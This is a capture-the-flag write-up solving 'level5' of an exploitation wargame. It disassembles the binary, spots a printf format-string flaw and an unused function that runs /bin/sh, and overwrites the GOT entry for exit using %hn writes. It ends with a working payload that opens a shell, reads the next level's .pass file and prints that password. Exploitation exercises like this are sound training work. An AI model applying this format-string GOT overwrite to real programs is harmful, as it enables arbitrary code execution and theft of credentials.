# Level5

We can see that we have an executable file, which waits for input when launched, and which repeats what we have entered.

```
$ ls
level5
$ ./level5
test
test
```

The program contains a ``main`` that calls function ``n`` but also function ``o``, which is not called.

```
$ objdump -d level5

080484a4 <o>:
 80484a4:       55                      push   %ebp
 80484a5:       89 e5                   mov    %esp,%ebp
 80484a7:       83 ec 18                sub    $0x18,%esp
 80484aa:       c7 04 24 f0 85 04 08    movl   $0x80485f0,(%esp)
 80484b1:       e8 fa fe ff ff          call   80483b0 <system@plt>
 80484b6:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484bd:       e8 ce fe ff ff          call   8048390 <_exit@plt>

080484c2 <n>:
 80484c2:       55                      push   %ebp
 80484c3:       89 e5                   mov    %esp,%ebp
 80484c5:       81 ec 18 02 00 00       sub    $0x218,%esp
 80484cb:       a1 48 98 04 08          mov    0x8049848,%eax
 80484d0:       89 44 24 08             mov    %eax,0x8(%esp)
 80484d4:       c7 44 24 04 00 02 00    movl   $0x200,0x4(%esp)
 80484db:       00
 80484dc:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484e2:       89 04 24                mov    %eax,(%esp)
 80484e5:       e8 b6 fe ff ff          call   80483a0 <fgets@plt>
 80484ea:       8d 85 f8 fd ff ff       lea    -0x208(%ebp),%eax
 80484f0:       89 04 24                mov    %eax,(%esp)
 80484f3:       e8 88 fe ff ff          call   8048380 <printf@plt>
 80484f8:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484ff:       e8 cc fe ff ff          call   80483d0 <exit@plt>

08048504 <main>:
 8048504:       55                      push   %ebp
 8048505:       89 e5                   mov    %esp,%ebp
 8048507:       83 e4 f0                and    $0xfffffff0,%esp
 804850a:       e8 b3 ff ff ff          call   80484c2 <n>
 804850f:       c9                      leave
 8048510:       c3                      ret
 8048511:       90                      nop
 8048512:       90                      nop
 8048513:       90                      nop
 8048514:       90                      nop
 8048515:       90                      nop
 8048516:       90                      nop
 8048517:       90                      nop
 8048518:       90                      nop
 8048519:       90                      nop
 804851a:       90                      nop
 804851b:       90                      nop
 804851c:       90                      nop
 804851d:       90                      nop
 804851e:       90                      nop
 804851f:       90                      nop
```

the function ``o`` call system.

```
$ objdump -d level5

080484a4 <o>:
 80484a4:       55                      push   %ebp
 80484a5:       89 e5                   mov    %esp,%ebp
 80484a7:       83 ec 18                sub    $0x18,%esp
 80484aa:       c7 04 24 f0 85 04 08    movl   $0x80485f0,(%esp)
 80484b1:       e8 fa fe ff ff          call   80483b0 <system@plt>
 80484b6:       c7 04 24 01 00 00 00    movl   $0x1,(%esp)
 80484bd:       e8 ce fe ff ff          call   8048390 <_exit@plt>
```

We can see that system is called with ``/bin/sh`` as a parameter, so it should be able to call the function ``o``.

```
$ gdb level5
(gdb) b n
Breakpoint 1 at 0x80484cb
(gdb) r
Starting program: /home/user/level5/level5

Breakpoint 1, 0x080484cb in n ()
(gdb) x/s 0x80485f0
0x80485f0:       "/bin/sh"
```

The technique we're going to use is called a GOT Overwrite.
</br>
We will rewrite the address of the function ``o`` over the address of the ``exit`` function in the function ``n``.
</br>
Here is the offset of the exit in ``n``: 08049838

```
$ objdump -R level5

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```

We can see that the payload is in 4th place.

```
$ ./level5
AAAA.%p.%p.%p.%p.%p
AAAA.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x2e70252e
```

The exit address is ``0x08049838``, or ``\x38\x98\x04\x08`` in little-endian format.
</br>
and the value of ``0x080484a4`` is ``134513828``
</br>
134513828 - 4 = 134513824

```
$ (python -c 'print("\x38\x98\x04\x08" + "%0134513824d%4$n")'; cat) | ./level5
too long....
```

134513824 is too long to write.
We can see that the payload continues, so we can use 4 and 5 to write the value on 2 bytes.

```
$ ./level5
AAAABBBB.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAABBBB.0x200.0xb7fd1ac0.0xb7ff37d0.0x41414141.0x42424242.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025
```

Since printing ``134,513,828 characters`` to write the full address in one go is inefficient and likely to crash the session,
</br>
we use the ``%hn`` specifier. This allows us to write the target address ``0x080484a4`` (the address of function o) in ``two 16-bit chunks``.

The Global Offset Table (GOT) entry for exit is at ``0x08049838``.
</br>
In a 32-bit Little-Endian system, this memory space is structured as follows:
- 0x08049838: Stores the lower 2 bytes (0x84a4).
- 0x0804983a: Stores the upper 2 bytes (0x0804).

We must print a number of characters equal to the value we want to write. Since the printf internal counter only increases, we write the ``smaller value first``:

Higher bytes (0x0804):
- Decimal value: 2052
- Calculation: 2052−8 (length of the two addresses already in the buffer) = 2044.

Lower bytes (0x84a4):
- Decimal value: 33956
- Calculation: 33956−2052 (current characters already printed) = 31904.


```
$ (python -c 'print("\x3a\x98\x04\x08" + "\x38\x98\x04\x08" + "%2044d%4$hn" + "%31904d%5$hn")'; cat) | ./level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
